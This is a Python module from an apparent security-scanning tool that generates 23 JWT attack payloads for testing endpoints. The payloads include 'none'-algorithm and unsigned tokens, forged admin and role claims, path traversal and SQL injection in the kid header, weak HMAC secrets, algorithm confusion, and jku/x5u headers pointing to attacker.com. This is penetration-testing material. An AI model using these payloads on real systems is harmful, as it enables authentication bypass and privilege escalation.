"""
JWT Vulnerability Testing Module
20+ test vectors for comprehensive JWT security testing
"""

import json
import base64
import time
from typing import List, Dict, Any, Optional
import hmac
import hashlib

from ..models import (
    PayloadTemplate,
    VulnerabilityType,
    EncodingType,
    MutationStrategyType,
    PositionType,
    SeverityLevel,
    TestCase,
    Position,
)


class JWTTestVectors:
    """Comprehensive JWT vulnerability test vectors"""

    @staticmethod
    def base64url_encode(data: bytes) -> str:
        """Base64 URL encoding without padding"""
        return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")

    @staticmethod
    def base64url_decode(data: str) -> bytes:
        """Base64 URL decoding with padding"""
        padding = 4 - (len(data) % 4)
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data)

    @staticmethod
    def create_jwt(header: Dict[str, Any], payload: Dict[str, Any], secret: str = "") -> str:
        """Create a JWT token"""
        header_enc = JWTTestVectors.base64url_encode(json.dumps(header).encode())
        payload_enc = JWTTestVectors.base64url_encode(json.dumps(payload).encode())

        if header.get("alg") == "none":
            return f"{header_enc}.{payload_enc}."

        # Create signature (simplified - only HS256)
        message = f"{header_enc}.{payload_enc}"
        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
        signature_enc = JWTTestVectors.base64url_encode(signature)

        return f"{header_enc}.{payload_enc}.{signature_enc}"

    @staticmethod
    def parse_jwt(token: str) -> tuple[Dict[str, Any], Dict[str, Any], str]:
        """Parse JWT into header, payload, signature"""
        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")

        header = json.loads(JWTTestVectors.base64url_decode(parts[0]))
        payload = json.loads(JWTTestVectors.base64url_decode(parts[1]))
        signature = parts[2]

        return header, payload, signature

    @staticmethod
    def get_test_vectors() -> List[PayloadTemplate]:
        """Get all 20+ JWT test vectors"""

        current_time = int(time.time())
        future_time = current_time + 3600
        past_time = current_time - 3600

        test_vectors = []

        # 1. Algorithm Confusion: none algorithm
        test_vectors.append(
            PayloadTemplate(
                id="jwt-001-alg-none",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {"alg": "none", "typ": "JWT"}, {"sub": "admin", "exp": future_time}
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "authenticated", "success"],
                tags=["jwt", "alg-confusion", "none"],
                severity=SeverityLevel.CRITICAL,
                description="JWT with algorithm 'none' - server may accept unsigned tokens",
            )
        )

        # 2. Algorithm Confusion: NONE (uppercase)
        test_vectors.append(
            PayloadTemplate(
                id="jwt-002-alg-NONE",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {"alg": "NONE", "typ": "JWT"}, {"sub": "admin", "exp": future_time}
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "authenticated"],
                tags=["jwt", "alg-confusion", "case-sensitivity"],
                severity=SeverityLevel.CRITICAL,
                description="JWT with algorithm 'NONE' (uppercase variant)",
            )
        )

        # 3. Algorithm Confusion: nOnE (mixed case)
        test_vectors.append(
            PayloadTemplate(
                id="jwt-003-alg-mixed",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {"alg": "nOnE", "typ": "JWT"}, {"sub": "admin", "exp": future_time}
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "authenticated"],
                tags=["jwt", "alg-confusion", "case-sensitivity"],
                severity=SeverityLevel.CRITICAL,
                description="JWT with algorithm 'nOnE' (mixed case)",
            )
        )

        # 4. Expired token
        test_vectors.append(
            PayloadTemplate(
                id="jwt-004-expired",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {"alg": "HS256", "typ": "JWT"}, {"sub": "user", "exp": past_time}, "secret"
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "authenticated", "success"],
                tags=["jwt", "expiration", "timing"],
                severity=SeverityLevel.HIGH,
                description="Expired JWT - server should reject but may accept",
            )
        )

        # 5. Token not yet valid (nbf - not before)
        test_vectors.append(
            PayloadTemplate(
                id="jwt-005-not-before",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {"alg": "HS256", "typ": "JWT"},
                    {"sub": "user", "nbf": future_time, "exp": future_time + 7200},
                    "secret",
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "authenticated"],
                tags=["jwt", "nbf", "timing"],
                severity=SeverityLevel.MEDIUM,
                description="JWT with future nbf (not before) claim",
            )
        )

        # 6. Tampered claims: sub changed to admin
        header_b64 = JWTTestVectors.base64url_encode(
            json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
        )
        payload_b64 = JWTTestVectors.base64url_encode(
            json.dumps({"sub": "admin", "exp": future_time}).encode()
        )
        test_vectors.append(
            PayloadTemplate(
                id="jwt-006-tampered-sub",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=f"{header_b64}.{payload_b64}.INVALID_SIGNATURE",
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "admin", "authenticated"],
                tags=["jwt", "tampering", "sub-claim"],
                severity=SeverityLevel.CRITICAL,
                description="JWT with tampered 'sub' claim and invalid signature",
            )
        )

        # 7. Tampered claims: role escalation
        payload_b64_role = JWTTestVectors.base64url_encode(
            json.dumps({"sub": "user", "role": "admin", "exp": future_time}).encode()
        )
        test_vectors.append(
            PayloadTemplate(
                id="jwt-007-role-escalation",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=f"{header_b64}.{payload_b64_role}.INVALID_SIGNATURE",
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "admin", "privilege"],
                tags=["jwt", "tampering", "role", "privilege-escalation"],
                severity=SeverityLevel.CRITICAL,
                description="JWT with tampered 'role' claim for privilege escalation",
            )
        )

        # 8. Empty signature
        test_vectors.append(
            PayloadTemplate(
                id="jwt-008-empty-sig",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=f"{header_b64}.{payload_b64}.",
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "authenticated"],
                tags=["jwt", "signature", "empty"],
                severity=SeverityLevel.CRITICAL,
                description="JWT with empty signature component",
            )
        )

        # 9. Missing signature (only header.payload)
        test_vectors.append(
            PayloadTemplate(
                id="jwt-009-no-sig",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=f"{header_b64}.{payload_b64}",
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "authenticated"],
                tags=["jwt", "signature", "missing"],
                severity=SeverityLevel.CRITICAL,
                description="JWT without signature component",
            )
        )

        # 10. KID manipulation: null
        test_vectors.append(
            PayloadTemplate(
                id="jwt-010-kid-null",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {"alg": "HS256", "typ": "JWT", "kid": None},
                    {"sub": "admin", "exp": future_time},
                    "secret",
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "error", "null"],
                tags=["jwt", "kid", "null-byte"],
                severity=SeverityLevel.HIGH,
                description="JWT with null KID (key ID) - may cause null pointer or bypass",
            )
        )

        # 11. KID manipulation: path traversal
        test_vectors.append(
            PayloadTemplate(
                id="jwt-011-kid-traversal",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {"alg": "HS256", "typ": "JWT", "kid": "../../etc/passwd"},
                    {"sub": "admin", "exp": future_time},
                    "secret",
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "root:", "authenticated"],
                tags=["jwt", "kid", "path-traversal"],
                severity=SeverityLevel.CRITICAL,
                description="JWT with path traversal in KID - may read arbitrary files",
            )
        )

        # 12. KID manipulation: SQL injection
        test_vectors.append(
            PayloadTemplate(
                id="jwt-012-kid-sqli",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {"alg": "HS256", "typ": "JWT", "kid": "key123' OR '1'='1"},
                    {"sub": "admin", "exp": future_time},
                    "secret",
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "SQL", "error", "authenticated"],
                tags=["jwt", "kid", "sqli"],
                severity=SeverityLevel.CRITICAL,
                description="JWT with SQL injection payload in KID",
            )
        )

        # 13. Weak HMAC secret: empty
        test_vectors.append(
            PayloadTemplate(
                id="jwt-013-weak-secret-empty",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {"alg": "HS256", "typ": "JWT"}, {"sub": "admin", "exp": future_time}, ""
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "authenticated"],
                tags=["jwt", "weak-secret", "hmac"],
                severity=SeverityLevel.CRITICAL,
                description="JWT signed with empty HMAC secret",
            )
        )

        # 14. Weak HMAC secret: common password
        test_vectors.append(
            PayloadTemplate(
                id="jwt-014-weak-secret-password",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {"alg": "HS256", "typ": "JWT"}, {"sub": "admin", "exp": future_time}, "password"
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "authenticated"],
                tags=["jwt", "weak-secret", "hmac", "brute-force"],
                severity=SeverityLevel.HIGH,
                description="JWT signed with weak/common HMAC secret",
            )
        )

        # 15. Algorithm confusion: HS256 -> RS256
        test_vectors.append(
            PayloadTemplate(
                id="jwt-015-alg-hs-to-rs",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {"alg": "RS256", "typ": "JWT"},
                    {"sub": "admin", "exp": future_time},
                    "PUBLIC_KEY_AS_SECRET",
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "authenticated"],
                tags=["jwt", "alg-confusion", "rs256", "hs256"],
                severity=SeverityLevel.CRITICAL,
                description="Algorithm confusion: RS256 using public key as HMAC secret",
            )
        )

        # 16. Missing 'typ' header
        test_vectors.append(
            PayloadTemplate(
                id="jwt-016-missing-typ",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {"alg": "HS256"}, {"sub": "admin", "exp": future_time}, "secret"
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "authenticated"],
                tags=["jwt", "typ", "header"],
                severity=SeverityLevel.LOW,
                description="JWT without 'typ' header field",
            )
        )

        # 17. Invalid JSON in header (extra comma)
        header_invalid = JWTTestVectors.base64url_encode(b'{"alg":"HS256",,}')
        test_vectors.append(
            PayloadTemplate(
                id="jwt-017-invalid-json-header",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=f"{header_invalid}.{payload_b64}.sig",
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "error", "JSON"],
                tags=["jwt", "malformed", "json"],
                severity=SeverityLevel.MEDIUM,
                description="JWT with invalid JSON in header",
            )
        )

        # 18. Audience (aud) tampering
        payload_aud = JWTTestVectors.base64url_encode(
            json.dumps({"sub": "user", "aud": "admin-service", "exp": future_time}).encode()
        )
        test_vectors.append(
            PayloadTemplate(
                id="jwt-018-aud-tampering",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=f"{header_b64}.{payload_aud}.INVALID",
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "authenticated", "admin"],
                tags=["jwt", "aud", "tampering"],
                severity=SeverityLevel.HIGH,
                description="JWT with tampered audience (aud) claim",
            )
        )

        # 19. Issuer (iss) tampering
        payload_iss = JWTTestVectors.base64url_encode(
            json.dumps({"sub": "user", "iss": "trusted-issuer", "exp": future_time}).encode()
        )
        test_vectors.append(
            PayloadTemplate(
                id="jwt-019-iss-tampering",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=f"{header_b64}.{payload_iss}.INVALID",
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "authenticated"],
                tags=["jwt", "iss", "tampering"],
                severity=SeverityLevel.HIGH,
                description="JWT with tampered issuer (iss) claim",
            )
        )

        # 20. JTI (JWT ID) replay
        test_vectors.append(
            PayloadTemplate(
                id="jwt-020-jti-replay",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {"alg": "HS256", "typ": "JWT"},
                    {"sub": "user", "jti": "replayed-token-id-12345", "exp": future_time},
                    "secret",
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "authenticated", "success"],
                tags=["jwt", "jti", "replay"],
                severity=SeverityLevel.MEDIUM,
                description="JWT with replayed JTI (token ID) - server should track and reject",
            )
        )

        # 21. X5U header injection (for remote key fetch)
        test_vectors.append(
            PayloadTemplate(
                id="jwt-021-x5u-injection",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {"alg": "RS256", "typ": "JWT", "x5u": "http://attacker.com/malicious.crt"},
                    {"sub": "admin", "exp": future_time},
                    "secret",
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "http", "attacker"],
                tags=["jwt", "x5u", "ssrf", "remote-key"],
                severity=SeverityLevel.CRITICAL,
                description="JWT with malicious x5u header (SSRF via remote certificate fetch)",
            )
        )

        # 22. JKU header injection (for remote JWK set fetch)
        test_vectors.append(
            PayloadTemplate(
                id="jwt-022-jku-injection",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {"alg": "RS256", "typ": "JWT", "jku": "http://attacker.com/jwks.json"},
                    {"sub": "admin", "exp": future_time},
                    "secret",
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "http", "attacker"],
                tags=["jwt", "jku", "ssrf", "remote-key"],
                severity=SeverityLevel.CRITICAL,
                description="JWT with malicious jku header (SSRF via remote JWK set fetch)",
            )
        )

        # 23. Embedded JWK with attacker's key
        test_vectors.append(
            PayloadTemplate(
                id="jwt-023-embedded-jwk",
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=JWTTestVectors.create_jwt(
                    {
                        "alg": "RS256",
                        "typ": "JWT",
                        "jwk": {"kty": "RSA", "use": "sig", "n": "attacker_modulus", "e": "AQAB"},
                    },
                    {"sub": "admin", "exp": future_time},
                    "secret",
                ),
                encodings=[EncodingType.NONE],
                mutation_strategies=[MutationStrategyType.REPLACE],
                applicable_positions=[
                    PositionType.HEADER,
                    PositionType.COOKIE,
                    PositionType.BODY_JSON,
                ],
                expected_signals=["200", "authenticated"],
                tags=["jwt", "jwk", "embedded-key"],
                severity=SeverityLevel.CRITICAL,
                description="JWT with embedded JWK containing attacker's public key",
            )
        )

        return test_vectors


class JWTTester:
    """JWT vulnerability tester"""

    @staticmethod
    def generate_test_cases(
        position: Position, original_token: Optional[str] = None
    ) -> List[TestCase]:
        """Generate JWT test cases for a position"""

        test_vectors = JWTTestVectors.get_test_vectors()
        test_cases = []

        for i, vector in enumerate(test_vectors):
            test_case = TestCase(
                id=f"test-{position.id}-{vector.id}",
                endpoint=position.endpoint,
                method=position.method,
                position=position,
                vulnerability_type=VulnerabilityType.JWT_VULN,
                payload=vector.payload,
                encoding=EncodingType.NONE,
                mutation_strategy=MutationStrategyType.REPLACE,
                expected_signal=", ".join(vector.expected_signals),
                rationale=vector.description,
                priority=i + 1,
                destructive=False,
                template=vector,
            )
            test_cases.append(test_case)

        return test_cases
